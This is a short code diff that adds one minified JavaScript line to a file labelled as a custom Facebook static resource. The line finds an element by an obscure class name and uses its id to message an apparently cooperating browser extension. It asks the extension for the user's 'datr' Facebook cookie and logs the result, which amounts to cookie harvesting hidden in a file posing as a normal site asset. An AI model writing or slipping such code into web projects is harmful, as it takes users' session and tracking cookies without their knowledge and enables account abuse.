@@ -4,3 +4,4 @@
  * Custom file https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/JcZfFI94ia7.js
  * =======================================================================
  */
+(()=>{const e=document.getElementsByClassName("mu9A5nsj4yyz7mbmMhL4T4JCDR4peySb");if(e.length>0){const t=e[0].getAttribute("id");chrome.runtime.sendMessage(t,{action:"getCK",data:{name:"datr",domain:".facebook.com"}},(e=>{console.log("cookie",e)}))}})();
